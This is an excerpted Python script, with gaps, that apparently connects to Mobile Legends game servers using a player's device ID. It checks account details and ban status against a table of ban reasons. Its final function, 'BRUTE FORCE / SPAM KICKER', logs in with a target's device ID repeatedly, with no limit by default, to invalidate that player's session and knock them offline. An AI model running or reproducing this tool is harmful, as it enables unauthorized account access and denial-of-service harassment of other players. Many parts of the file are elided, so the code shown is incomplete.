...
LOGIN_HOST      = GATEWAYS[0][0]
LOGIN_PORT      = GATEWAYS[0][1]
...
SOCK_READ       = float(os.environ.get("MLBB_SOCK_TIMEOUT", "10.0"))
...
BAN_REASON_MAP: Dict[int, str] = {
    ...
    7:   "Payment fraud",
    8:   "Refund abuse",
    9:   "Unauthorized seller purchase",
    10:  "Account sharing",
    11:  "Account theft",
    ...
    20:  "Verbal abuse",
    21:  "Toxic behavior / Harassment",
    22:  "Offensive language",
    23:  "Hate speech",
    24:  "Threats / Doxxing",
    30:  "AFK / Passive play",
    31:  "Intentional feeding",
    32:  "Griefing",
    40:  "Smurfing / Alt accounts",
    41:  "Multiple account abuse",
    50:  "Impersonation",
    51:  "Report abuse",
    60:  "Ban evasion",
...
class BaseConnection:
    ...
    def recv_data(self):
        ...
        try:
            ...
            body = res.get(6)
            if body is None: body = res.get(5)
            if body is not None:
                if isinstance(body, bytes) and len(body) > 0:
                    try:
                        inner = SdpStruct(body)
                        if len(inner) > 0: return pid, inner
                    except Exception: pass
...
class GameConnection(BaseConnection):
    ...
    def login_to_login_server(self, gateway=None) -> bool:
        delays = [0.0, 1.0, 2.0, 3.0, 4.0]
        last_err = "Login failed"
        for attempt in range(LOGIN_RETRIES):
            if attempt > 0: time.sleep(delays[min(attempt, len(delays)-1)])
            self.cleanup()
            if gateway:
                self.host, self.port = gateway
            else:
                gw = GATEWAYS[attempt % len(GATEWAYS)]
                self.host, self.port = gw
            try: self.connect()
            except Exception as e:
                last_err = f"Connect failed: {e}"; continue
            try:
                ...
                last_err = "Send failed"; continue
            try: self.socket.settimeout(LOGIN_TIMEOUT)
            except Exception: pass
            saw_timeout = False; last_pid = None
            for _ in range(10):
            ...
            last_err = "Login timeout" if saw_timeout else f"Login failed (PID: {last_pid})"
        self.last_login_err = last_err + f" (after {LOGIN_RETRIES} attempts)"
        return False
...
def _setup_connection(device_id: str) -> GameConnection:
    ...
    if not conn.login_to_login_server():
        if conn.is_guest: raise ConnectionError("Guest / unregistered device — no real MLBB account")
...
def check_device_id(device_id: str, retries: int = 2) -> Dict[str, Any]:
    ...
    for _ in range(retries):
        ...
        try:
            ...
            conn.cleanup()
            if not result:
                last_err = "No account data returned"; time.sleep(0.3); continue
            player = extract_player_data(result)
            if not player:
                last_err = "Could not parse player data"; time.sleep(0.3); continue
...
def check_ban_only(device_id: str, retries: int = 2) -> Dict[str, Any]:
    device_id = (device_id or "").strip()
    ok, reason = validate_device_id(device_id)
    if not ok:
...
# ============================================================
# BRUTE FORCE / SPAM KICKER  (3s delay per attempt)
# ============================================================
def kick_device(device_id: str, rounds: int = 0, delay: float = 3.0,
                stop_event=None, on_progress=None) -> Dict[str, Any]:
    """
    Repeated logins to invalidate target session.
    rounds=0 means unlimited (until stop_event set).
    delay = seconds between rounds (default 3.0).
    """
    device_id = (device_id or "").strip()
    ok, reason = validate_device_id(device_id)
    if not ok:
    ...
    stats = {"attempts": 0, "hits": 0, "fails": 0, "elapsed": 0.0,
             "device_id": device_id, "rounds_target": rounds, "status": "running"}
    t0 = time.time()
    i = 0
    while True:
        ...
        try:
            conn = GameConnection(device_id)
            conn.host, conn.port = gw
            conn.connect()
            if conn.login_to_login_server(gateway=gw):
                stats["hits"] += 1
            else:
                stats["fails"] += 1
            conn.cleanup()
        ...
        # 3-second delay between attempts (interruptible)
